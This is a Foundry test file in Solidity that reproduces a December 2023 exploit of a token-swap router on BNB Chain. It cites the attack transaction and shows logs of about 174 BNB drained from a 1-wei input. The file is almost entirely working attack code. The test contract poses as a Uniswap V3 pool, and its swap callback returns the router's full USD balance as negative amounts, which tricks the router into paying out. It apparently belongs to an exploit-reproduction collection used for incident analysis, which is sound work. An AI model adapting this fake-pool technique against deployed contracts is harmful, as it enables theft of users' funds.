// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    Attack tx: https://explorer.phalcon.xyz/tx/bsc/0x93ae5f0a121d5e1aadae052c36bc5ecf2d406d35222f4c6a5d63fef1d6de1081
    Tweet alert: https://twitter.com/Phalcon_xyz/status/1737355152779030570

    [PASS] testExploit() (gas: 226246)
    Logs:
        Balance BNB before attack: 0.000000000000000001
        Balance USD of router: 43841.867959016089190183
        Balance BNB after attack: 173.907186477338745776
*/

struct ExactInputV3SwapParams {
    address srcToken;
    address dstToken;
    address dstReceiver;
    address wrappedToken;
    uint256 amount;
    uint256 minReturnAmount;
    uint256 fee;
    uint256 deadline;
    uint256[] pools;
    bytes signature;
    string channel;
}

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address router = 0x00000047bB99ea4D791bb749D970DE71EE0b1A34;

    address pool_usd_wbnb = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;

    address usd = 0x55d398326f99059fF775485246999027B3197955;

    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address bnb = address(0);

    function setUp() external {
        cheats.createSelectFork("bsc", 34_506_417 - 1);
        deal(address(this), 1);
    }

    function testExploit() public {
        emit log_named_decimal_uint("Balance BNB before attack", address(this).balance, 18);
        emit log_named_decimal_uint("Balance USD of router", IERC20(usd).balanceOf(router), 18);
        uint256[] memory pools = new uint256[](2);
        pools[0] = uint256(uint160(address(this)));
        pools[1] = 452_312_848_583_266_388_373_324_160_500_822_705_807_063_255_235_247_521_466_952_638_073_588_228_176;
        ExactInputV3SwapParams memory params = ExactInputV3SwapParams({
            srcToken: bnb,
            dstToken: bnb,
            dstReceiver: address(this),
            wrappedToken: wbnb,
            amount: 1,
            minReturnAmount: 0,
            fee: 0,
            deadline: block.timestamp,
            pools: pools,
            signature: bytes(""),
            channel: ""
        });
        ITransitRouter(router).exactInputV3Swap{value: 1}(params);
        emit log_named_decimal_uint("Balance BNB after attack", address(this).balance, 18);
    }

    function token0() external view returns (address) {
        return wbnb;
    }

    function token1() external view returns (address) {
        return usd;
    }

    function fee() external pure returns (uint24) {
        return 0;
    }

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        return (-int256(IERC20(usd).balanceOf(router)), -int256(IERC20(usd).balanceOf(router)));
    }

    receive() external payable {}
}

interface ITransitRouter {
    function transitFee() external view returns (uint256, uint256);
    function exactInputV3Swap(ExactInputV3SwapParams calldata params) external payable returns (uint256 returnAmount);
}

interface IUniswapV3Pool {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}
